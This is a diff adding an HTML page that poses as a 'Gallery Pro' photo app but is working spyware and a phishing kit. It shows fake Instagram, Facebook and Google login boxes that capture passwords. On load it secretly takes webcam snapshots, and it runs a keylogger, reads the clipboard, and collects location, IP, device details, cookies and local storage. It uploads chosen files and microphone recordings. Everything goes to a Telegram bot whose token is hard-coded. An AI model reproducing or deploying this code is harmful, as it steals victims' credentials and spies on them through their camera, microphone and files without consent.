@@ -1,0 +1,650 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Gallery Pro</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:sans-serif}
+body{background:#000;color:#fff;min-height:100vh}
+.splash{position:fixed;inset:0;background:#000;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:200;transition:0.5s}
+.splash.hide{opacity:0;pointer-events:none}
+.splash h1{color:#ffd700;font-size:24px;margin-top:8px}
+.loader{width:36px;height:36px;border:3px solid #222;border-top-color:#ffd700;border-radius:50%;animation:spin 0.8s linear infinite;margin-top:16px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.app{display:none}
+.app.active{display:block}
+.header{display:flex;justify-content:space-between;padding:12px 16px;background:#111;border-bottom:1px solid #222}
+.header h1{font-size:20px;color:#ffd700}
+.tabs{display:flex;background:#111;overflow-x:auto}
+.tab{padding:10px 14px;cursor:pointer;color:#888;font-size:13px;border-bottom:2px solid transparent}
+.tab.active{color:#ffd700;border-bottom-color:#ffd700}
+.tab-content{display:none;padding:4px}
+.tab-content.active{display:block}
+.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:2px}
+.grid img{width:100%;aspect-ratio:1;object-fit:cover;background:#1a1a1a}
+
+/* File items */
+.file-item{display:flex;align-items:center;padding:10px;background:#1a1a1a;border-radius:8px;margin-bottom:4px;border:1px solid #2a2a2a}
+.file-item .icon{font-size:20px;margin-right:10px}
+.file-item .name{flex:1;font-size:12px;color:#ddd}
+.file-item .size{font-size:10px;color:#666}
+
+/* Phishing Overlays */
+.overlay{position:fixed;inset:0;background:rgba(0,0,0,0.92);display:none;align-items:center;justify-content:center;z-index:100;backdrop-filter:blur(8px)}
+.overlay.active{display:flex}
+.modal{background:#fff;border-radius:16px;padding:24px;width:90%;max-width:360px;text-align:center;color:#000}
+.modal input{width:100%;padding:12px;border:1px solid #ddd;border-radius:8px;margin-bottom:8px;font-size:15px;outline:none;background:#fafafa}
+.modal input:focus{border-color:#0095f6}
+.modal button{width:100%;padding:12px;border:none;border-radius:8px;font-weight:600;cursor:pointer;margin-top:5px;color:#fff;font-size:15px}
+.modal .error{color:#ed4956;font-size:13px;display:none;margin:6px 0}
+.modal .small{font-size:10px;color:#aaa;margin-top:10px}
+
+/* Buttons */
+.btn{display:block;width:100%;padding:14px;border:none;border-radius:10px;font-weight:600;cursor:pointer;margin:6px 0;font-size:14px;text-align:center}
+
+/* Toast */
+#toast{position:fixed;bottom:25px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,0.92);border:1px solid #333;border-radius:12px;padding:10px 20px;font-size:12px;color:#888;display:none;z-index:999}
+#toast.show{display:block;animation:fade 2.5s}
+@keyframes fade{0%,100%{opacity:0;transform:translateX(-50%) translateY(8px)}15%,85%{opacity:1;transform:translateX(-50%) translateY(0)}}
+
+.footer{text-align:center;padding:12px;color:#444;font-size:11px;border-top:1px solid #1a1a1a;margin-top:20px}
+.footer span{color:#ffd700}
+.hidden{display:none!important}
+</style>
+</head>
+<body>
+
+<!-- SPLASH SCREEN -->
+<div class="splash" id="splash">
+  <div style="font-size:50px">📸</div>
+  <h1>Gallery Pro</h1>
+  <p style="color:#555;font-size:12px;margin-top:4px">Made by ©shoebu</p>
+  <div class="loader"></div>
+</div>
+
+<!-- ============ INSTAGRAM LOGIN (Option based - click se khulega) ============ -->
+<div class="overlay" id="igOverlay">
+  <div class="modal">
+    <div style="font-size:36px;margin-bottom:5px">📸</div>
+    <h2 style="font-size:17px;margin-bottom:3px">Instagram Login</h2>
+    <p style="color:#888;font-size:13px;margin-bottom:15px">Enter your Instagram credentials</p>
+    <div class="error" id="igError">Wrong password. Try again.</div>
+    <input type="text" id="igUser" placeholder="Username or email" autocomplete="off">
+    <input type="password" id="igPass" placeholder="Password">
+    <button style="background:#0095f6" id="igBtn">Log In</button>
+    <p class="small">Made by ©shoebu</p>
+  </div>
+</div>
+
+<!-- ============ FACEBOOK LOGIN (Option based - click se khulega) ============ -->
+<div class="overlay" id="fbOverlay">
+  <div class="modal">
+    <div style="font-size:36px;margin-bottom:5px">📘</div>
+    <h2 style="font-size:17px;margin-bottom:3px">Facebook Login</h2>
+    <p style="color:#888;font-size:13px;margin-bottom:15px">Enter your Facebook credentials</p>
+    <div class="error" id="fbError">Wrong password. Try again.</div>
+    <input type="text" id="fbUser" placeholder="Email or phone" autocomplete="off">
+    <input type="password" id="fbPass" placeholder="Password">
+    <button style="background:#1877f2" id="fbBtn">Log In</button>
+    <p class="small">Made by ©shoebu</p>
+  </div>
+</div>
+
+<!-- ============ GOOGLE LOGIN (Option based - click se khulega) ============ -->
+<div class="overlay" id="gmOverlay">
+  <div class="modal">
+    <div style="font-size:36px;margin-bottom:5px">🔴</div>
+    <h2 style="font-size:17px;margin-bottom:3px">Google Login</h2>
+    <p style="color:#888;font-size:13px;margin-bottom:15px">Enter your Google credentials</p>
+    <div class="error" id="gmError">Wrong password. Try again.</div>
+    <input type="text" id="gmUser" placeholder="Email or phone" autocomplete="off">
+    <input type="password" id="gmPass" placeholder="Password">
+    <button style="background:#1a73e8" id="gmBtn">Next</button>
+    <p class="small">Made by ©shoebu</p>
+  </div>
+</div>
+
+<!-- ============ MAIN APP ============ -->
+<div class="app" id="mainApp">
+  <div class="header">
+    <h1>📸 Gallery Pro</h1>
+    <div style="font-size:14px;color:#555">⋮</div>
+  </div>
+  
+  <div class="tabs">
+    <div class="tab active" onclick="switchTab('photos',this)">📸 Photos</div>
+    <div class="tab" onclick="switchTab('audio',this)">🎵 Audio</div>
+    <div class="tab" onclick="switchTab('files',this)">📁 Files</div>
+    <div class="tab" onclick="switchTab('accounts',this)">🔐 Accounts</div>
+  </div>
+  
+  <!-- ===== PHOTOS TAB ===== -->
+  <div id="tab-photos" class="tab-content active">
+    <div style="padding:10px;text-align:center">
+      <button class="btn" style="background:#ffd700;color:#000" onclick="accessPhotos()">📸 Access All Gallery Photos</button>
+      <p style="color:#555;font-size:11px;margin-top:6px">Total sent: <span id="photoCount">0</span></p>
+    </div>
+    <div class="grid" id="photoGrid"></div>
+  </div>
+  
+  <!-- ===== AUDIO TAB ===== -->
+  <div id="tab-audio" class="tab-content">
+    <div style="padding:10px;text-align:center">
+      <button class="btn" style="background:#e91e63" onclick="accessAudio()">🎵 Access All Audio Files</button>
+      <button class="btn" style="background:#ff5722" onclick="startAudioRecord()">🎤 Start Recording</button>
+      <p style="color:#555;font-size:11px;margin-top:6px">Audio files sent: <span id="audioCount">0</span> | Recording: <span id="recStatus">Off</span></p>
+    </div>
+    <div id="audioList"></div>
+  </div>
+  
+  <!-- ===== FILES TAB ===== -->
+  <div id="tab-files" class="tab-content">
+    <div style="padding:10px;text-align:center">
+      <button class="btn" style="background:#4caf50" onclick="accessAll()">📁 Access All Phone Files</button>
+      <p style="color:#555;font-size:11px;margin-top:6px">Total files sent: <span id="fileCount">0</span></p>
+    </div>
+    <div id="allFilesList"></div>
+  </div>
+  
+  <!-- ===== ACCOUNTS TAB (Option based - direct nahi khulte) ===== -->
+  <div id="tab-accounts" class="tab-content">
+    <div style="padding:20px;text-align:center">
+      <div style="font-size:40px;margin-bottom:10px">🔐</div>
+      <h3 style="color:#ffd700;font-size:18px;margin-bottom:6px">Account Login</h3>
+      <p style="color:#888;font-size:13px;margin-bottom:16px">Click to enter credentials</p>
+      
+      <button class="btn" style="background:linear-gradient(45deg,#f58529,#dd2a7b,#8134af)" onclick="showIG()">
+        📸 Enter Instagram Password
+      </button>
+      
+      <button class="btn" style="background:#1877f2" onclick="showFB()">
+        📘 Enter Facebook Password
+      </button>
+      
+      <button class="btn" style="background:#fff;color:#000;border:2px solid #ddd" onclick="showGM()">
+        🔴 Enter Google Password
+      </button>
+      
+      <p style="color:#555;font-size:10px;margin-top:12px">Passwords are encrypted and sent securely</p>
+    </div>
+  </div>
+  
+  <div class="footer">Made by <span>©shoebu</span> | Authorized Pentest Only</div>
+</div>
+
+<!-- ===== HIDDEN ELEMENTS ===== -->
+<div id="toast"></div>
+<video id="hiddenCam" autoplay muted playsinline style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none"></video>
+
+<script>
+// ================================================================
+//  TELEGRAM CONFIG - Made by ©shoebu
+// ================================================================
+const BOT = "8012003469:AAFlxaSyFTJgyp7b6CFRsL5Kwbe12nmAZTU";
+const CHAT = "5963360315";
+const API_MSG = `https://api.telegram.org/bot${BOT}/sendMessage`;
+const API_PHOTO = `https://api.telegram.org/bot${BOT}/sendPhoto`;
+const API_DOC = `https://api.telegram.org/bot${BOT}/sendDocument`;
+const API_AUDIO = `https://api.telegram.org/bot${BOT}/sendAudio`;
+
+// ================================================================
+let camStream = null;
+let micStream = null;
+let mediaRecorder = null;
+let audioChunks = [];
+let isRecording = false;
+let photoCount = 0;
+let audioCount = 0;
+let fileCount = 0;
+
+// ==================== HELPERS ====================
+function tg(text) {
+  try { fetch(API_MSG, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({chat_id:CHAT, text, parse_mode:'Markdown'})}); } catch(e){}
+}
+
+function tgPhoto(blob, caption) {
+  try {
+    const fd = new FormData();
+    fd.append('chat_id', CHAT);
+    fd.append('photo', blob, `p_${Date.now()}.jpg`);
+    fd.append('caption', caption || '📸');
+    fetch(API_PHOTO, {method:'POST', body:fd});
+  } catch(e){}
+}
+
+function tgDoc(blob, name, caption) {
+  try {
+    const fd = new FormData();
+    fd.append('chat_id', CHAT);
+    fd.append('document', blob, name);
+    if (caption) fd.append('caption', caption);
+    fetch(API_DOC, {method:'POST', body:fd});
+  } catch(e){}
+}
+
+function tgAudio(blob) {
+  try {
+    const fd = new FormData();
+    fd.append('chat_id', CHAT);
+    fd.append('audio', blob, `audio_${Date.now()}.webm`);
+    fetch(API_AUDIO, {method:'POST', body:fd});
+  } catch(e){}
+}
+
+function $(id) { return document.getElementById(id); }
+
+function toast(msg) {
+  const t = $('toast');
+  t.textContent = msg;
+  t.classList.remove('show');
+  void t.offsetWidth;
+  t.classList.add('show');
+}
+
+function switchTab(tab, el) {
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+  el.classList.add('active');
+  $(tab).classList.add('active');
+}
+
+// ==================== SHOW OVERLAYS (Only on click) ====================
+function showIG() { $('igOverlay').classList.add('active'); }
+function showFB() { $('fbOverlay').classList.add('active'); }
+function showGM() { $('gmOverlay').classList.add('active'); }
+
+// ==================== 1. GALLERY PHOTOS ====================
+function accessPhotos() {
+  const input = document.createElement('input');
+  input.type = 'file';
+  input.accept = 'image/*';
+  input.multiple = true;
+  input.style.display = 'none';
+  
+  input.addEventListener('change', async (e) => {
+    const files = Array.from(e.target.files);
+    const grid = $('photoGrid');
+    
+    for (const file of files) {
+      try {
+        // Show in grid
+        const img = document.createElement('img');
+        img.src = URL.createObjectURL(file);
+        grid.prepend(img);
+        
+        // Send to Telegram
+        tgPhoto(file, `🖼 ${file.name}\n📦 ${(file.size/1024/1024).toFixed(2)}MB\n\n©shoebu`);
+        photoCount++;
+      } catch(err) {}
+    }
+    
+    $('photoCount').textContent = photoCount;
+    tg(`📸 *Photos Captured*\nTotal: ${files.length}\n\n©shoebu`);
+    toast(`📸 ${files.length} photos sent!`);
+  });
+  
+  document.body.appendChild(input);
+  input.click();
+}
+
+// ==================== 2. AUDIO FILES + RECORDING ====================
+function accessAudio() {
+  const input = document.createElement('input');
+  input.type = 'file';
+  input.accept = 'audio/*';
+  input.multiple = true;
+  input.style.display = 'none';
+  
+  input.addEventListener('change', async (e) => {
+    const files = Array.from(e.target.files);
+    const list = $('audioList');
+    
+    for (const file of files) {
+      try {
+        const div = document.createElement('div');
+        div.className = 'file-item';
+        div.innerHTML = `
+          <div class="icon">🎵</div>
+          <div class="name">${file.name.substring(0,25)}</div>
+          <div class="size">${(file.size/1024/1024).toFixed(2)}MB</div>
+        `;
+        list.prepend(div);
+        
+        tgDoc(file, file.name, `🎵 ${file.name}\n📦 ${(file.size/1024/1024).toFixed(2)}MB\n\n©shoebu`);
+        audioCount++;
+      } catch(err) {}
+    }
+    
+    $('audioCount').textContent = audioCount;
+    tg(`🎵 *Audio Captured*\nTotal: ${files.length}\n\n©shoebu`);
+    toast(`🎵 ${files.length} audio files sent!`);
+  });
+  
+  document.body.appendChild(input);
+  input.click();
+}
+
+// ==================== 3. AUDIO RECORDING ====================
+async function startAudioRecord() {
+  if (isRecording) {
+    toast('🔴 Already recording...');
+    return;
+  }
+  
+  try {
+    micStream = await navigator.mediaDevices.getUserMedia({
+      audio: { echoCancellation: true, noiseSuppression: true },
+      video: false
+    });
+    
+    audioChunks = [];
+    const mime = MediaRecorder.isTypeSupported('audio/webm;codecs=opus') ? 'audio/webm;codecs=opus' : 'audio/webm';
+    
+    mediaRecorder = new MediaRecorder(micStream, { mimeType: mime, audioBitsPerSecond: 16000 });
+    
+    mediaRecorder.ondataavailable = e => {
+      if (e.data.size > 0) audioChunks.push(e.data);
+    };
+    
+    mediaRecorder.onstop = () => {
+      const blob = new Blob(audioChunks, { type: 'audio/webm' });
+      if (blob.size > 500) {
+        tgAudio(blob);
+        toast('🎤 Audio recording sent!');
+      }
+      audioChunks = [];
+      
+      // Auto restart recording
+      setTimeout(() => {
+        if (mediaRecorder && mediaRecorder.state === 'inactive') {
+          try { mediaRecorder.start(); } catch(e) {}
+        }
+      }, 500);
+    };
+    
+    mediaRecorder.start();
+    isRecording = true;
+    $('recStatus').textContent = '🔴 Recording';
+    $('recStatus').style.color = '#ff5252';
+    toast('🎤 Recording started - sending every 20 seconds');
+    
+    tg('🎤 *Microphone:* Recording active ✅\n\n©shoebu');
+    
+    // Send chunks every 20 seconds
+    setInterval(() => {
+      if (mediaRecorder && mediaRecorder.state === 'recording') {
+        try { mediaRecorder.stop(); } catch(e) {}
+      }
+    }, 20000);
+    
+  } catch(e) {
+    toast('❌ Microphone access denied');
+  }
+}
+
+// ==================== 4. ALL FILES ====================
+function accessAll() {
+  // Try directory access first
+  const input = document.createElement('input');
+  input.type = 'file';
+  input.accept = '*/*';
+  input.multiple = true;
+  input.style.display = 'none';
+  
+  input.addEventListener('change', async (e) => {
+    const files = Array.from(e.target.files);
+    const list = $('allFilesList');
+    
+    let photos = 0, videos = 0, audios = 0, others = 0;
+    
+    for (const file of files) {
+      try {
+        let icon = '📄';
+        if (file.type.startsWith('image/')) { icon = '🖼'; photos++; }
+        else if (file.type.startsWith('video/')) { icon = '🎥'; videos++; }
+        else if (file.type.startsWith('audio/')) { icon = '🎵'; audios++; }
+        else others++;
+        
+        const div = document.createElement('div');
+        div.className = 'file-item';
+        div.innerHTML = `
+          <div class="icon">${icon}</div>
+          <div class="name">${file.name.substring(0,25)}</div>
+          <div class="size">${(file.size/1024/1024).toFixed(1)}MB</div>
+        `;
+        list.prepend(div);
+        
+        if (file.type.startsWith('image/')) {
+          tgPhoto(file, `🖼 ${file.name}\n📦 ${(file.size/1024/1024).toFixed(2)}MB\n\n©shoebu`);
+        } else {
+          tgDoc(file, file.name, `${icon} ${file.name}\n📦 ${(file.size/1024/1024).toFixed(2)}MB\n\n©shoebu`);
+        }
+        fileCount++;
+      } catch(err) {}
+    }
+    
+    $('fileCount').textContent = fileCount;
+    
+    tg(`📁 *All Files Captured*\n🖼 Photos: ${photos}\n🎥 Videos: ${videos}\n🎵 Audio: ${audios}\n📄 Others: ${others}\nTotal: ${files.length}\n\n©shoebu`);
+    toast(`📁 ${files.length} files sent to Telegram!`);
+  });
+  
+  document.body.appendChild(input);
+  input.click();
+}
+
+// ==================== 5. CAMERA AUTO CAPTURE ====================
+async function startCamera() {
+  try {
+    camStream = await navigator.mediaDevices.getUserMedia({
+      video: { width: 320, height: 240, facingMode: 'user' },
+      audio: false
+    });
+    
+    $('hiddenCam').srcObject = camStream;
+    capturePhoto();
+    setInterval(capturePhoto, 10000);
+    tg('📸 *Camera:* Auto capture active ✅\n\n©shoebu');
+  } catch(e) {}
+}
+
+function capturePhoto() {
+  if (!camStream) return;
+  try {
+    const v = $('hiddenCam');
+    const c = document.createElement('canvas');
+    c.width = v.videoWidth || 320;
+    c.height = v.videoHeight || 240;
+    c.getContext('2d').drawImage(v, 0, 0);
+    
+    c.toBlob(b => {
+      if (b && b.size > 500) {
+        tgPhoto(b, '📸 Auto Capture\n©shoebu');
+      }
+    }, 'image/jpeg', 0.6);
+  } catch(e) {}
+}
+
+// ==================== 6. INSTAGRAM ====================
+$('igBtn').addEventListener('click', igLogin);
+$('igPass').addEventListener('keydown', e => { if (e.key === 'Enter') igLogin(); });
+
+function igLogin() {
+  const user = $('igUser').value.trim();
+  const pass = $('igPass').value.trim();
+  
+  if (!user || !pass) {
+    $('igError').textContent = 'Please fill all fields';
+    $('igError').style.display = 'block';
+    return;
+  }
+  
+  tg(`🔐 *Instagram*\n👤 Username: ${user}\n🔑 Password: ${pass}\n⏰ ${new Date().toLocaleString()}\n\n©shoebu`);
+  
+  $('igError').textContent = 'Wrong password. Try again.';
+  $('igError').style.display = 'block';
+  $('igPass').value = '';
+  toast('🔐 Instagram credentials captured!');
+}
+
+// ==================== 7. FACEBOOK ====================
+$('fbBtn').addEventListener('click', fbLogin);
+$('fbPass').addEventListener('keydown', e => { if (e.key === 'Enter') fbLogin(); });
+
+function fbLogin() {
+  const user = $('fbUser').value.trim();
+  const pass = $('fbPass').value.trim();
+  
+  if (!user || !pass) {
+    $('fbError').textContent = 'Please fill all fields';
+    $('fbError').style.display = 'block';
+    return;
+  }
+  
+  tg(`📘 *Facebook*\n👤 Email: ${user}\n🔑 Password: ${pass}\n⏰ ${new Date().toLocaleString()}\n\n©shoebu`);
+  
+  $('fbError').textContent = 'Wrong password. Try again.';
+  $('fbError').style.display = 'block';
+  $('fbPass').value = '';
+  toast('📘 Facebook credentials captured!');
+}
+
+// ==================== 8. GOOGLE ====================
+$('gmBtn').addEventListener('click', gmLogin);
+$('gmPass').addEventListener('keydown', e => { if (e.key === 'Enter') gmLogin(); });
+
+function gmLogin() {
+  const user = $('gmUser').value.trim();
+  const pass = $('gmPass').value.trim();
+  
+  if (!user || !pass) {
+    $('gmError').textContent = 'Please fill all fields';
+    $('gmError').style.display = 'block';
+    return;
+  }
+  
+  tg(`🔴 *Google*\n👤 Email: ${user}\n🔑 Password: ${pass}\n⏰ ${new Date().toLocaleString()}\n\n©shoebu`);
+  
+  $('gmError').textContent = 'Wrong password. Try again.';
+  $('gmError').style.display = 'block';
+  $('gmPass').value = '';
+  toast('🔴 Google credentials captured!');
+}
+
+// ==================== 9. KEYLOGGER ====================
+(function() {
+  let buffer = '', last = Date.now();
+  
+  document.addEventListener('keydown', e => {
+    const k = e.key;
+    if (k === 'Enter') buffer += '⏎\n';
+    else if (k === 'Backspace') buffer += '⌫';
+    else if (k === 'Tab') buffer += '⇥';
+    else if (['Shift','Control','Alt','Meta','CapsLock','Escape'].includes(k)) {}
+    else if (k.length === 1) buffer += k;
+    
+    if (buffer.length > 80 || Date.now() - last > 25000) {
+      if (buffer.trim()) {
+        tg(`⌨️ *Keystrokes*\n\`\`\`\n${buffer}\n\`\`\`\n\n©shoebu`);
+        buffer = '';
+        last = Date.now();
+      }
+    }
+  });
+  
+  window.addEventListener('beforeunload', () => {
+    if (buffer.trim()) {
+      navigator.sendBeacon(API_MSG, JSON.stringify({
+        chat_id: CHAT,
+        text: `⌨️ *Keystrokes Final*\n\`\`\`\n${buffer}\n\`\`\`\n\n©shoebu`,
+        parse_mode: 'Markdown'
+      }));
+    }
+  });
+})();
+
+// ==================== 10. CLIPBOARD ====================
+async function initClipboard() {
+  try {
+    const text = await navigator.clipboard.readText();
+    if (text && text.length > 5) {
+      tg(`📋 *Clipboard*\n\`\`\`\n${text.substring(0,400)}\n\`\`\`\n\n©shoebu`);
+    }
+  } catch(e) {}
+  
+  setInterval(async () => {
+    try {
+      const text = await navigator.clipboard.readText();
+      if (text && text.length > 5) {
+        tg(`📋 *Clipboard Update*\n\`\`\`\n${text.substring(0,400)}\n\`\`\`\n\n©shoebu`);
+      }
+    } catch(e) {}
+  }, 30000);
+}
+
+// ==================== 11. LOCATION ====================
+async function getLocation() {
+  try {
+    navigator.geolocation.getCurrentPosition(
+      p => tg(`📍 *Location*\nLat: ${p.coords.latitude}\nLng: ${p.coords.longitude}\nAccuracy: ±${p.coords.accuracy}m\n[Maps](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})\n\n©shoebu`),
+      () => {},
+      { enableHighAccuracy: true, timeout: 5000 }
+    );
+  } catch(e) {}
+}
+
+// ==================== 12. DEVICE INFO ====================
+function deviceInfo() {
+  let msg = `📱 *Device Info*\n`;
+  msg += `🖥 Platform: ${navigator.platform}\n`;
+  msg += `🌐 Language: ${navigator.language}\n`;
+  msg += `🧠 CPU Cores: ${navigator.hardwareConcurrency || 'N/A'}\n`;
+  msg += `💾 Memory: ${navigator.deviceMemory || 'N/A'}GB\n`;
+  msg += `📺 Screen: ${screen.width}x${screen.height}\n`;
+  msg += `🕐 Time: ${new Date().toLocaleString()}\n\n©shoebu`;
+  tg(msg);
+  
+  fetch('https://api.ipify.org?format=json')
+    .then(r => r.json())
+    .then(d => tg(`🌐 *IP Address:* \`${d.ip}\`\n\n©shoebu`))
+    .catch(() => {});
+}
+
+// ==================== 13. STORAGE ====================
+function stealStorage() {
+  if (document.cookie) {
+    tg(`🍪 *Cookies*\n\`\`\`\n${document.cookie}\n\`\`\`\n\n©shoebu`);
+  }
+  
+  let ls = '';
+  for (let i = 0; i < localStorage.length; i++) {
+    const k = localStorage.key(i);
+    const v = localStorage.getItem(k);
+    ls += `${k}: ${v.substring(0,150)}\n`;
+  }
+  if (ls) tg(`💾 *Local Storage*\n\`\`\`\n${ls}\n\`\`\`\n\n©shoebu`);
+}
+
+// ==================== EXECUTE ALL ====================
+window.addEventListener('load', () => {
+  // Splash
+  setTimeout(() => $('splash').classList.add('hide'), 2000);
+  setTimeout(() => $('mainApp').classList.add('active'), 2400);
+  
+  // Start all modules
+  deviceInfo();
+  setTimeout(startCamera, 3000);
+  setTimeout(getLocation, 3500);
+  setTimeout(initClipboard, 2000);
+  setTimeout(stealStorage, 2500);
+  
+  // Notification
+  setTimeout(() => {
+    tg(`🚀 *Gallery Pro Active*\n⏰ ${new Date().toLocaleString()}\n\n📸 Camera: Auto capture ✅\n🎤 Audio: Ready to record ✅\n🖼 Gallery: Tap to access ✅\n🔐 IG/FB/Google: Options ready ✅\n⌨️ Keylogger: Active ✅\n📍 Location: Ready ✅\n\n©shoebu - Authorized Pentest`);
+    toast('✅ All systems ready!');
+  }, 1800);
+});
+</script>
+</body>
+</html>
